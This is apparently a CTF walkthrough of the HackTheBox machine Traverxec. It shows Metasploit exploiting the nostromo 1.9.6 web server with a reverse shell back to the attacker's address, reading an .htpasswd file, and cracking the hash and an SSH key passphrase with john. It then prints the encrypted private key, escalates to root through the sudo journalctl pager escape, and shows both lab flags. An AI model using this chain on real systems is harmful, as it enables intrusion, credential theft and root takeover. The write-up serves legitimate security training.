![](images/boxInfo.png)

nmap -sC -sV 10.10.10.165
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 15:05 EST
Nmap scan report for 10.10.10.165
Host is up (0.58s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.77 seconds
```

found nostromo exploit on metasploit
```
msf5 > search nostromo                                                                                                                                                                                             
                                                                                                                                                                                                                   
Matching Modules                                                                                                                                                                                                   
================                                                                                                                                                                                                   
                                                                                                                                                                                                                   
   #  Name                                   Disclosure Date  Rank  Check  Description                                                                                                                             
   -  ----                                   ---------------  ----  -----  -----------                                                                                                                             
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
msf5 > use 0                                                                                                                                                                                                       
msf5 exploit(multi/http/nostromo_code_exec) >                                                                                                                                                                      
msf5 exploit(multi/http/nostromo_code_exec) > show options                                                                                                                                                         
                                                                                                                                                                                                                   
Module options (exploit/multi/http/nostromo_code_exec):                                                                                                                                                            
                                                                                                                                                                                                                   
   Name     Current Setting  Required  Description                                                                                                                                                                 
   ----     ---------------  --------  -----------                                                                                                                                                                 
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]                                                                                                                
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                                                                                          
   RPORT    80               yes       The target port (TCP)                                                                                                                                                       
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0                                                                                        
   SRVPORT  8080             yes       The local port to listen on.                                                                                                                                                
   SSL      false            no        Negotiate SSL/TLS for outgoing connections                                                                                                                                  
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)                                                                                                            
   URIPATH                   no        The URI to use for this exploit (default is random)                                                                                                                         
   VHOST                     no        HTTP server virtual host                                                                                                                                                    
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
Payload options (cmd/unix/reverse_perl):                                                                                                                                                                           

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port 


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > set rhost 10.10.10.165
rhost => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set lhost 10.10.15.57
lhost => 10.10.15.57
msf5 exploit(multi/http/nostromo_code_exec) > check
[*] 10.10.10.165:80 - The target appears to be vulnerable.
msf5 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.15.57:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.15.57:4444 -> 10.10.10.165:35010) at 2020-03-17 15:56:58 -0400

pwd
/usr/bin
python3 -c "import pty; pty.spawn('/bin/bash');"

www-data@traverxec:/usr/bin$ ls /var
backups  cache  lib  local  lock  log  mail  nostromo  opt  run  spool  tmp

www-data@traverxec:/usr/bin$ ls /var/nostromo
conf  htdocs  icons  logs

www-data@traverxec:/usr/bin$ ls -al /var/nostromo/conf
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 .
drwxr-xr-x 6 root root   4096 Oct 25 14:43 ..
-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf

www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

we can try to crack this password using john  
copy the hash ($1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/) in a file called david.hash
```
root@kali:~/Desktop/HTB/activeMachines/Traverxec# john --wordlist=/usr/share/wordlists/rockyou.txt david.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (?)
1g 0:00:00:58 DONE (2020-03-17 16:08) 0.01706g/s 180550p/s 180550c/s 180550C/s Noyoo..Noury
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

lets see the config files
```
www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

at the end of the config file we can see the name of the public directory  
so david's home directory must have public_www directory  
lets see whats in that directory  
```
www-data@traverxec:/usr/bin$ cd /home/david/public_www

www-data@traverxec:/home/david/public_www$ ls -al
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 7 david david 4096 Mar 17 16:52 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area

www-data@traverxec:/home/david/public_www$ cd protected-file-area

www-data@traverxec:/home/david/public_www/protected-file-area$ ls -al
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz

www-data@traverxec:/home/david/public_www/protected-file-area$ cat .htaccess
realm David's Protected File Area. Keep out!
```

we found the ssh key tar file lets extract it in a tmp directory
```
www-data@traverxec:/home/david/public_www/protected-file-area$ mktemp -d
/tmp/tmp.tCQcnAHbiS

www-data@traverxec:/home/david/public_www/protected-file-area$ tar -zxvf backup-ssh-identity-files.tgz -C /tmp/tmp.tCQcnAHbiS
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

www-data@traverxec:/home/david/public_www/protected-file-area$ cd /tmp/tmp.tCQcnAHbiS

www-data@traverxec:/tmp/tmp.tCQcnAHbiS$ ls
home

www-data@traverxec:/tmp/tmp.tCQcnAHbiS$ cd home

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home$ ls
david

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home$ cd david

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home/david$ ls

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home/david$ ls -al
total 12
drwxr-xr-x 3 www-data www-data 4096 Mar 17 17:11 .
drwxr-xr-x 3 www-data www-data 4096 Mar 17 17:11 ..
drwx------ 2 www-data www-data 4096 Oct 25 17:02 .ssh

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home/david$ cd .ssh

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home/david/.ssh$ ls -al
total 20
drwx------ 2 www-data www-data 4096 Oct 25 17:02 .
drwxr-xr-x 3 www-data www-data 4096 Mar 17 17:11 ..
-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 authorized_keys
-rw------- 1 www-data www-data 1766 Oct 25 17:02 id_rsa
-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 id_rsa.pub

www-data@traverxec:/tmp/tmp.tCQcnAHbiS/home/david/.ssh$ cat id_rsa  
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

lets use john to crack the passphrase for id_rsa
```
root@kali:~/Desktop/HTB/activeMachines/Traverxec# /usr/share/john/ssh2john.py id_rsa_david > id_rsa_david.hash                                                                                                     

root@kali:~/Desktop/HTB/activeMachines/Traverxec# john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH id_rsa_david.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa_david)
Warning: Only 1 candidate left, minimum 8 needed for performance.
1g 0:00:00:03 DONE (2020-03-17 16:46) 0.3039g/s 4359Kp/s 4359Kc/s 4359KC/s *7¡Vamos!
Session completed
```

awesome!! now we can ssh as david and read user.txt
```
root@kali:~/Desktop/HTB/activeMachines/Traverxec# ssh -i id_rsa_david david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa_david': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Mar 17 16:41:08 2020 from 10.10.15.218

david@traverxec:~$ ls
bin  public_www  user.txt

david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```

in the bin folder the last command in the server-stats.sh script runs as root  
so we can try to take advantage of that
```
david@traverxec:~$ cd bin                                                                                                                                                                                          
david@traverxec:~/bin$ ls -la                                                                                                                                                                                      
total 16
drwx------ 2 david david 4096 Oct 25 16:26 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-r-------- 1 david david  802 Oct 25 16:26 server-stats.head
-rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh
david@traverxec:~/bin$ cat server-stats.head 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

Load:  18:48:38 up 5 min,  2 users,  load average: 0.00, 0.05, 0.02
  
Open nhttpd sockets: 4
Files in the docroot: 117
  
Last 5 journal log lines:
-- Logs begin at Tue 2020-03-17 18:43:19 EDT, end at Tue 2020-03-17 18:48:38 EDT. --
Mar 17 18:43:23 traverxec systemd[1]: Starting nostromo nhttpd server...
Mar 17 18:43:23 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory
Mar 17 18:43:23 traverxec nhttpd[457]: started
Mar 17 18:43:23 traverxec nhttpd[457]: max. file descriptors = 1040 (cur) / 1040 (max)
Mar 17 18:43:23 traverxec systemd[1]: Started nostromo nhttpd server.
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

i searched for journalctl on gtfobins and found that it internally uses less to print the output
```
https://gtfobins.github.io/gtfobins/journalctl/

This invokes the default pager, which is likely to be less, other functions may apply.

This might not work if run by unprivileged users depending on the system configuration.
Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

    journalctl
    !/bin/sh

Sudo

It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    sudo journalctl
    !/bin/sh
```

so if we remove the output being piped to cat, it will use less for the output  
and from bandit OverTheWire i know that less and more have the vulnerability of command execution if window size is small enough  
copy the .sh file out of the bin folder (because the .sh file inside bin folder was not writable) and remove "| /usr/bin/cat" from the last line  
now make the window size small enough and run ./server-stats.sh and use "!/bin/bash" to get root shell  
```
root@traverxec:/home/david# whoami
root
root@traverxec:/home/david# ls
bin  public_www  server-stats.sh  user.txt
root@traverxec:/home/david# ls /root
nostromo_1.9.6-1.deb  root.txt
root@traverxec:/home/david# cat /root/root.txt 
9aa36a6d76f785dfd320a478f6e0d906
```

![](images/prize.png)

